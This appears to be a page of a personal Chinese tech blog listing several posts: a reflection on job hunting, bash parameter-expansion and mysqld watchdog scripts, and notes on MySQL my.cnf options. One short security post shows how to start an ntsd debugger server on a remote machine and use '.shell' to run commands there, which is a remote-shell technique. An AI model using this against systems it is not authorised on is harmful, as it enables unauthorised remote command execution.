+        <p>&nbsp; 看了几位大牛的blog，发现自己太浮躁的了，太没有耐心了。想到什么做什么，没有一点计划性。但往往计划了，却不去坚持。</p><p>记得，高中读狼图腾的时候，发现狼为了，捕捉猎物。会一动不动，等待几个小时。一旦时机成熟，立马去行动。狼一直是我崇拜的偶像，</p><p>耐性要改一改了。如果人重复去做单一的事情，他就不是很简单，而我现在做不到。工作终于辞职下来了，看了看网上的招聘信息。linux方面，真的很少的。也许不是一个招聘的季节，也许不是一个做技术的城市。迷茫中、换工作，还是转城市。还是、、、、</p><p>&nbsp;</p><p></p>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://key1088.github.io/2011/05/21/%E6%B5%AE%E8%BA%81%E7%9A%84%E5%A4%A9%EF%BC%8C%E6%B5%AE%E8%BA%81%E7%9A%84%E6%88%91%E3%80%82/" data-id="clgrjlxky009q7opi0r0l8x1c" data-title="浮躁的天，浮躁的我。" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-ntsd-应用技巧" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2011/05/17/ntsd-%E5%BA%94%E7%94%A8%E6%8A%80%E5%B7%A7/" class="article-date">
+  <time class="dt-published" datetime="2011-05-17T04:58:00.000Z" itemprop="datePublished">2011-05-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2011/05/17/ntsd-%E5%BA%94%E7%94%A8%E6%8A%80%E5%B7%A7/">ntsd 应用技巧</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>远程机:ntsd -server tcp:port=1234 calc.exe</p><p>本机:ntsd -remote tcp:server=IP,port=1234</p><p>.shell</p><p>命令</p><p></p>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://key1088.github.io/2011/05/17/ntsd-%E5%BA%94%E7%94%A8%E6%8A%80%E5%B7%A7/" data-id="clgrjlxia00517opi5yvhdk9f" data-title="ntsd 应用技巧" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-shell-中$()-、-${}-and-$(())-用法" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2011/04/29/shell-%E4%B8%AD$()-%E3%80%81-$%7B%7D-and-$(())-%E7%94%A8%E6%B3%95/" class="article-date">
+  <time class="dt-published" datetime="2011-04-29T04:48:00.000Z" itemprop="datePublished">2011-04-29</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2011/04/29/shell-%E4%B8%AD$()-%E3%80%81-$%7B%7D-and-$(())-%E7%94%A8%E6%B3%95/">shell 中$() 、 ${} and $(()) 用法</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>脚本如下：</p><p><strong>#!/bin/bash<br />#test $() and ${} and $(())&nbsp; useges<br />#by:key1088@163.com<br />#mail:key1088@163.com<br /><br /><br />file=$(pwd)<br />echo $file<br />echo<br />echo '${file#*/}'<br />echo ${file#*/}<br />echo<br /><br />echo '${file##*/}'<br />echo ${file##*/}<br />echo<br /><br />echo '$(file%/*)'<br />echo ${file%%/*}<br />echo<br /><br />echo '${file/cis7/cis8/}'<br />echo ${file/cis7/cis8/}<br />echo<br /><br />echo '${file//cis7/cis8/}'<br />echo ${file//cis7/cis8/}<br />echo<br /><br />echo '${file:0:5}'<br />echo ${file:0:5}<br />echo<br /><br />echo '${file:5:5}'<br />echo ${file:5:5}<br />echo<br /><br />echo '$(#file)'<br />echo $
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://key1088.github.io/2011/04/29/shell-%E4%B8%AD$()-%E3%80%81-$%7B%7D-and-$(())-%E7%94%A8%E6%B3%95/" data-id="clgrjlxj7006i7opigriu4ii8" data-title="shell 中$() 、 ${} and $(()) 用法" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-mysqld守护脚本" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2011/04/28/mysqld%E5%AE%88%E6%8A%A4%E8%84%9A%E6%9C%AC/" class="article-date">
+  <time class="dt-published" datetime="2011-04-28T08:23:00.000Z" itemprop="datePublished">2011-04-28</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Mysql/">Mysql</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2011/04/28/mysqld%E5%AE%88%E6%8A%A4%E8%84%9A%E6%9C%AC/">mysqld守护脚本</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>#!&#x2F;bin&#x2F;sh<br />#This is check msyqld shell<br />#by:<a href="mailto:&#107;&#x65;&#121;&#49;&#48;&#x38;&#x38;&#64;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;">&#107;&#x65;&#121;&#49;&#48;&#x38;&#x38;&#64;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;</a><br />#守护mysqld脚本，防止意外崩溃。<br>#如果连接启动10次，依旧启动不来了。停止（可以写成运行某个程序），解决内存。<br>&amp;nbsp;<br><strong>ERRLOG&#x3D;&#x2F;videodata&#x2F;mysqldata&#x2F;data&#x2F;CHINASOFT.err<br />load_mysqld ()<br />{<br />&#x2F;etc&#x2F;init.d&#x2F;mysqld start<br />}<br /><br />while&amp;nbsp; true<br />do<br />&amp;nbsp; i&#x3D;1<br />&amp;nbsp; PRO&#x3D;<code>ps aux|grep mysqld|grep -v grep</code><br />&amp;nbsp; if [ -z &quot;$PRO&quot; ]<br />&amp;nbsp; then<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; while true<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; do<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if [ -z &quot;$PRO&quot; ]<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; then<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; load_mysqld<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; echo &quot;<code>date +'%y%m%d %H:%M:%S'</code>&amp;nbsp;&amp;nbsp; $0 LOAD MSYQLD-[$i]&quot; &gt;&gt; $ERRLOG<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; sleep 20<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; PRO&#x3D;<code>ps aux|grep mysqld|grep -v grep</code><br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if [ -z &quot;$PRO&quot; ]<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; then&amp;nbsp;&amp;nbsp;&amp;nbsp;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; i&#x3D;$((i+1))<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; fi<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; break<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; fi<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if [ $i -eq 10 ]<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; then<br />&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; echo &quot;<code>date +'%y%m%d %H:%M:%S'</code> HR_MYSQL_SAFE.SH LOAD MSQQLD –STOP&quot; &gt;&gt; $ERRLOG<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; exit 1<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; fi<br />&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; done<br />&amp;nbsp; fi<br />&amp;nbsp; sleep 20<br />done</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://key1088.github.io/2011/04/28/mysqld%E5%AE%88%E6%8A%A4%E8%84%9A%E6%9C%AC/" data-id="clgrjlxi2004l7opi3hs321d6" data-title="mysqld守护脚本" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-MySQL中my.cnf文件选项" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2011/04/27/MySQL%E4%B8%ADmy.cnf%E6%96%87%E4%BB%B6%E9%80%89%E9%A1%B9/" class="article-date">
+  <time class="dt-published" datetime="2011-04-27T01:23:00.000Z" itemprop="datePublished">2011-04-27</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Mysql/">Mysql</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2011/04/27/MySQL%E4%B8%ADmy.cnf%E6%96%87%E4%BB%B6%E9%80%89%E9%A1%B9/">MySQL中my.cnf文件选项</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>MySQL中my.cnf文件选项<br /><br>mysqld服务器维护两种变量。全局变量影响服务器的全局操作。会话变量影响具体客户端连接相关操作。<br />可以在选项文件或命令行中设置全局变量。<br />用Set命令设置会话变量，当然它也可以设置全局变量。<br>就像oracle里面的初始化参数文件一样。下面是一些常用的选项说明，MySQL的管方文档上也有。</p><br /><br>如<br />mysql&gt; SET GLOBAL sort_buffer_size &#x3D; 10 * 1024 * 1024;<br />mysql&gt; SET SESSION sort_buffer_size &#x3D; 10 * 1024 * 1024;<br>如果你想用SET语句限制系统变量可设的最大值，可以在服务器启动时通过–maximum-var_name形式的选项来指定。<br />例如，要想防止query_cache_size的值运行时超过32MB，使用选项–maximum-query_cache_size&#x3D;32M。<br>mysqld_safe选项<br />–basedir&#x3D;path<br />MySQL安装目录的路径。<br>–core-file-size<br />mysqld能够创建的内核文件的大小。选项值传递给ulimit -c。<br>–datadir&#x3D;path<br />数据目录的路径。<br>–defaults-file&#x3D;path<br />读取的代替通用选项文件的选项文件名。如果给出，必须首选该选项。<br>–log-error&#x3D;path<br />将错误日志写入给定的文件。<br>-nice&#x3D;priority<br />使用nice程序根据给定值来设置服务器的调度优先级。<br>–open-files-limit&#x3D;count<br />mysqld能够打开的文件的数量。选项值传递给 ulimit -n。请注意你需要用root启动mysqld_safe来保证正确工作！<br>–pid-file&#x3D;path<br />进程ID文件的路径。<br>–port&#x3D;port_num<br />用来帧听TCP&#x2F;IP连接的端口号。端口号必须为1024或更大值，除非MySQL以root系统用户运行。<br />每个mysqld的Unix套接字文件和TCP&#x2F;IP端口号必须不同。<br>–ledir&#x3D;path<br />包含mysqld程序的目录的路径。使用该选项来显式表示服务器位置。<br>–no-defaults<br />不要读任何选项文件。如果给出，必须首选该选项。<br>–skip-character-set-client-handshake<br />忽略客户端发送的字符集信息，使用服务器的默认字符集。<br>–socket&#x3D;path<br />用于本地连接的Unix套接字文件。<br />每个mysqld的Unix套接字文件和TCP&#x2F;IP端口号必须不同。<br>–timezone&#x3D;zone<br />为给定的选项值设置TZ时区环境变量。<br>–user&#x3D;{user_name | user_id}<br />以用户名user_name或数字用户ID user_id运行mysqld服务器。<br />该&quot;用户&quot;指系统登录账户，而不是 授权表中的MySQL用户。<br><br />mysqld命令行选项<br />mysqld从[mysqld]和[server]组读取选项<br>–ansi<br />使用标准(ANSI)SQL语法代替MySQL语法。<br>–basedir&#x3D;path, -b path<br />MySQL安装目录的路径。通常所有路径根据该路径来解析。<br>–bootstrap<br />mysql_install_db脚本使用该选项来创建MySQL授权表，不需要启动MySQL服务器<br>–console<br />将错误日志消息写入stderr和stdout，即使指定了–log-error。<br>–character_sets_dir&#x3D;path<br />字符集安装的目录。<br>–chroot&#x3D;path<br />通过chroot()系统调用在启动过程中将mysqld服务器放入一个封闭环境中。这是推荐的一个安全措施。请注意使用该选项可以 限制LOAD DATA INFILE和SELECT … INTO OUTFILE。<br>–character_set_server&#x3D;charset<br />使用charset作为 默认服务器字符集。<br>–core_file<br />如果mysqld终止，写内核文件。<br>–datadir&#x3D;path, -h path <br />数据目录的路径。<br>–default_table_type&#x3D;type<br />设置表的默认类型。<br>–debug[&#x3D;debug_options], -# [debug_options]<br />如果MySQL配置了–with-debug，你可以使用该选项来获得一个跟踪文件，跟踪mysqld正进行的操作。debug_options字符串通常为’d:t:o，file_name’。<br>–default_time_zone&#x3D;type<br />设置默认服务器时区。该选项设置全局time_zone系统变量。默认时区与系统时区相同(用system_time_zone系统变量值给定)<br>–delay_key_write[&#x3D; OFF | ON | ALL]<br />如何使用DELAYED KEYS选项。键写入延迟会造成再次写MyISAM表时键缓冲区不能被清空。该选项只适用MyISAM表。<br />OFF DELAY_KEY_WRITE被忽略。<br />ON MySQL在CREATE TABLE中用DELAY_KEY_WRITE选项。这是 默认值。<br />ALL 用启用DELAY_KEY_WRITE选项创建表的相同方法对所有新打开表的进行处理。<br />如果启用了DELAY_KEY_WRITE，说明使用该项的表的键缓冲区在每次更新索引时不被清空，只有关闭表时才清空。<br />但如果你使用该特性，你应用–myisam_recover选项启动服务器，为所有MyISAM表添加自动检查。<br>–external_locking<br />用系统锁定。请注意如果你在lockd不能完全工作的系统上使用该选项(例如在Linux中)，mysqld容易死锁。<br />如果你在许多MySQL进程中使用该选项来更新MyISAM表，你必须确保满足下述条件：<br />使用正被另一个进程更新的表的查询的缓存不可使用。<br />不应在共享表中使用–delay-key-write&#x3D;ALL或DELAY_KEY_WRITE&#x3D;1。<br />最简单的方法是结合使用–external-locking和–delay-key-write&#x3D;OFF –query-cache-size&#x3D;0。<br />(默认不能实现，因为在许多设置中，结合使用上述选项很有用）。<br><br />–flush<br />执行SQL语句后向硬盘上清空更改。一般情况执行SQL语句后 MySQL向硬盘写入所有更改，让操作系统处理与硬盘的同步。<br><br />–init_file&#x3D;file<br />启动时从该文件读SQL语句。每个语句必须在同一行中并且不应包括注释。<br><br />–language&#x3D;lang_name, -L lang_name<br />用给定语言给出客户端错误消息。默认情况下，mysqld用英语给出错误消息。<br>–large_pages<br />一些硬件&#x2F;操作系统架构支持大于 默认值(通常4 KB)的内存页。实际支持取决于使用的硬件和OS。<br />大量访问内存的应用程序通过 使用较大的页，降低了Translation Lookaside Buffer (TLB)损失，可以改善性能。 <br />默认情况下该选项被禁用。<br>—log[&#x3D;file], -l [file]<br>如果你想要知道mysqld内部发生了什么，你应该用–log[&#x3D;file_name]或-l [file_name]选项启动它。如果没有给定file_name的值， 默认名是host_name.log。所有连接和语句被记录到日志文件。当你怀疑在客户端发生了错误并想确切地知道该客户端发送给mysqld的语句时，该日志可能非常有用。<br />mysqld按照它接收的顺序记录语句到查询日志。这可能与执行的顺序不同。<br>–log_bin&#x3D;[file]<br />二进制日志文件。将更改数据的所有查询记入该文件。用于备份和复制。<br />建议指定一个文件名,否则MySQL使用host_name-bin作为日志文件基本名。<br />运行服务器时若启用二进制日志则性能大约慢1%。<br>–binlog_do_db&#x3D;db_name<br />告诉主服务器，如果当前的数据库(即USE选定的数据库)是db_name，应将更新记录到二进制日志中。<br>–binlog_ignore_db&#x3D;db_name<br />告诉主服务器，如果当前的数据库(即USE选定的数据库)是db_name，不应将更新保存到二进制日志中。<br>–log_error[&#x3D;file]<br />该文件的日志错误和启动消息.<br />如果你不指定文件名，MySQL使用host_name.err作为文件名。如果文件名没有扩展名，则加上.err扩展名。<br><br />–log_isam[&#x3D;file] <br />将所有MyISAM更改记入该文件<br>–log_slow_queries[&#x3D;file] <br />将所有执行时间超过long_query_time 秒的查询记入该文件。<br>–log_warnings, -W<br />将警告例如Aborted connection…打印到错误日志。建议启用该选项，默认也是启用的。<br>–memlock<br />将mysqld 进程锁定在内存中。请注意使用该选项时需要以root运行服务器，但从安全考虑并不是一个好注意。<br>–myisam_recover [&#x3D;option[,option…]]]<br />存储引擎MyISAM设置为恢复模式。该选项值是DEFAULT、BACKUP、FORCE或QUICK值的任何组合。<br />如果你指定多个值，用逗号</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://key1088.github.io/2011/04/27/MySQL%E4%B8%ADmy.cnf%E6%96%87%E4%BB%B6%E9%80%89%E9%A1%B9/" data-id="clgrjlxi7004s7opifwsp21zj" data-title="MySQL中my.cnf文件选项" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/10/">&laquo; zurück</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/12/">weiter &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Kategorien</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/C%E7%BC%96%E7%A8%8B/">C编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/C%E7%BC%96%E7%A8%8B/">C编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/">Mysql</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Oracle/">Oracle</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Oracle/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Perl%E7%BC%96%E7%A8%8B/">Perl编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Php%E7%BC%96%E7%A8%8B/">Php编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Windows/">Windows</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/">Linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/%E5%AE%B9%E5%99%A8/">容器</a></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/">版本控制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%94%9F%E6%B4%BB%E6%84%9F%E6%83%B3/">生活感想</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">程序设计</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/C%E7%BC%96%E7%A8%8B/">C编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/Linux/">Linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/Linux/C%E7%BC%96%E7%A8%8B/">C编程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/Php%E7%BC%96%E7%A8%8B/">Php编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/Python%E7%BC%96%E7%A8%8B/">Python编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/C%E7%BC%96%E7%A8%8B/">C编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/">Linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/C%E7%BC%96%E7%A8%8B/">C编程</a></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Linux/">Linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Linux/C%E7%BC%96%E7%A8%8B/">C编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Linux/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/">网络工程</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/Php%E7%BC%96%E7%A8%8B/">Php编程</a></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-dbx/" rel="tag">C;dbx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MD5-CTX/" rel="tag">MD5_CTX</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/alarm/" rel="tag">alarm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/backup/" rel="tag">backup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fseek/" rel="tag">fseek</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftell/" rel="tag">ftell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gethostbyname/" rel="tag">gethostbyname</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/" rel="tag">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jmp-buf/" rel="tag">jmp_buf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%BD%95%E9%9F%B3/" rel="tag">linux录音</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/longjmp/" rel="tag">longjmp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mimikatz/" rel="tag">mimikatz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/minikube/" rel="tag">minikube</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx-%E8%84%9A%E6%9C%AC/" rel="tag">nginx;脚本</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openshift/" rel="tag">openshift</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openssl/" rel="tag">openssl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/paas/" rel="tag">paas</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/proxy/" rel="tag">proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qsort/" rel="tag">qsort</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/setjmp/" rel="tag">setjmp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss-easyxss/" rel="tag">xss;easyxss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/" rel="tag">云计算</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%91%E9%9C%89%E6%B4%BE/" rel="tag">树霉派</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9F%B3%E9%A2%91%E9%99%8D%E5%99%AA/" rel="tag">音频降噪</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/C-dbx/" style="font-size: 10px;">C;dbx</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/MD5-CTX/" style="font-size: 10px;">MD5_CTX</a> <a href="/tags/alarm/" style="font-size: 10px;">alarm</a> <a href="/tags/backup/" style="font-size: 10px;">backup</a> <a href="/tags/fseek/" style="font-size: 10px;">fseek</a> <a href="/tags/ftell/" style="font-size: 10px;">ftell</a> <a href="/tags/gethostbyname/" style="font-size: 10px;">gethostbyname</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/jmp-buf/" style="font-size: 10px;">jmp_buf</a> <a href="/tags/k8s/" style="font-size: 10px;">k8s</a> <a href="/tags/linux%E5%BD%95%E9%9F%B3/" style="font-size: 10px;">linux录音</a> <a href="/tags/longjmp/" style="font-size: 10px;">longjmp</a> <a href="/tags/mimikatz/" style="font-size: 10px;">mimikatz</a> <a href="/tags/minikube/" style="font-size: 10px;">minikube</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/nginx-%E8%84%9A%E6%9C%AC/" 